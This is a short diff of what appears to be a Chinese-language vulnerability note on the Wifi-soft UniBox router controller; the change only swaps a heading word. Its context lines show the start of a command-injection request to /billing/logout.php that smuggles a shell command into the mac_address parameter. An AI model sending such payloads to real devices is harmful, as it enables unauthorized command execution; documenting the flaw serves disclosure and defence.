@@ -59,7 +59,7 @@ Wifi-soft UniBox controller [路由器](#)产品中存在一个致命[漏洞](ht
 
 > 支持cookie获取参数，注意检测点，别漏
 >
-> 计算机安全
+> 网络安全
 
 ```
 GET /billing/logout.php?logout_user=1&mac_address=;id>11.txt HTTP/1.1
